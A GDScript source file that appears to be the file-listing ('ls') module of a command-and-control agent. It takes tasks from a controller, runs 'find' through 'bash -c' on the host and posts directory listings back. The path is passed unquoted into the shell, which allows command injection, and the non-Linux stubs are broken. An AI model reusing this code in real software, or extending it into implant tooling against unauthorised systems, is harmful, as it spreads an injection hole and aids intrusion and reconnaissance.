extends Node

var api

const outputFormat = '{\\"is_file\\": %s, \\"permissions\\": {\\"octal\\": \\"%%m\\", \\"gid\\":\\"%%G\\", \\"inode\\":\\"%%i\\", \\"uid\\":\\"%%U\\", \\"selinux\\":\\"%%Z\\", \\"fstype\\":\\"%%F\\"}, \\"name\\": \\"%%f\\", \\"access_time\\": \\"%%AFT%%AH:%%AM:%%AS%%Az\\", \\"modify_time\\": \\"%%AFT%%AH:%%AM:%%AS%%Az\\", \\"size\\": %%s, \\"parent\\": \\"%%h\\"}\\n'

func _ready():
	api = $".".get_parent().get_node("api")


func _on_tasking_ls(task):

	if task.has("command") and task.get("command") == "ls":
		var test_json_conv = JSON.new()
		test_json_conv.parse(task.get("parameters"))
		var parameters = test_json_conv.get_data()
		var path = parameters.get("path")
		var output = "Unable to obtain listing for: %s" % path
		var status = "error"

		var ret = []
		var sep = "/"

		if OS.has_feature("X11"):
			ret = get_linux_ls(path)
			
		if OS.has_feature("Windows"):
			ret = get_windows_ls(path)

			if path.find("/") >= 0:
				sep = "/"
			else:
				sep = "\\"

		if OS.has_feature("OSX"):
			ret = get_osx_ls(path)

		if OS.has_feature("iOS"):
			ret = get_ios_ls(path)

		if OS.has_feature("Android"):
			ret = get_android_ls(path)

		if ret["items"].size() > 0:
			status = "success"
			output = "Listing of %s retrieved!" % path

		var ls_response = {
			"task_id": task.get("id"),
			"user_output": output,
			"status": status,
			"completed": true,
			"file_browser": {
				"update_deleted": true,
				"success": false,
				"files": []
			}
		}

		if ret["items"].size() >= 1:
			path = path.rstrip(sep)

			if path == "":
				path = sep

			ls_response["file_browser"]["is_file"] = ret["is_file"]
			ls_response["file_browser"]["permissions"] = ret["tle"].get("permissions")
			ls_response["file_browser"]["name"] = ret["tle"].get("name")
			ls_response["file_browser"]["parent_path"] = path.get_base_dir()
			ls_response["file_browser"]["success"] = true
			ls_response["file_browser"]["access_time"] = ret["tle"].get("access_time")
			ls_response["file_browser"]["modify_time"] = ret["tle"].get("modify_time")
			ls_response["file_browser"]["size"] = ret["tle"].get("size")

		if ret["items"].size() > 1:
			ls_response["file_browser"]["files"] = ret["items"]

		print("\n\n")
		print(ls_response)
		print("\n\n")

		api.agent_response(
			JSON.stringify({
				"action": "post_response",
				"responses": [ls_response],
			})
		)
	else:
		pass
		# TODO: error state

func get_linux_ls_find_result(command):
	var result = []
	var output = []

	if 0 == OS.execute("bash", ["-c", command], output, true, false):

		for fileline in output[0].split('\n'):
			if fileline.length() > 0:
				var test_json_conv = JSON.new()
				test_json_conv.parse(fileline)
				var entry = test_json_conv.get_data()

				if typeof(entry) == TYPE_DICTIONARY:
					result.append(entry)

	return result

func get_linux_ls(path):
	var is_file = DirAccess.dir_exists_absolute(path)
	var result = []
	var tle = false

	# TODO: update to a single call?
	# 	$ find / \
	#   	\( -type f -printf "formats" \) , \
	#       \( -type d -printf "formats" \)

	var directories = get_linux_ls_find_result("find %s %s %s %s %s %s %s %s" % [path, "-maxdepth", "1", "-type", "d", "-printf", "'%s'" % [outputFormat % "false"], "2>/dev/null"])
	var files = get_linux_ls_find_result("find %s %s %s %s %s %s %s %s" % [path, "-maxdepth", "1", "-type", "f", "-printf", "'%s'" % [outputFormat % "true"], "2>/dev/null"])

	if is_file:
		tle = files.pop_front()
	else:
		tle = directories.pop_front()

	result.append_array(directories)
	result.append_array(files)

	return {"is_file": is_file, "tle": tle, "items": result}

func get_windows_ls(_path):
	return []

func get_osx_ls(_path):
	return []

func get_ios_ls(_path):
	return []

func get_android_ls(_path):
	return []
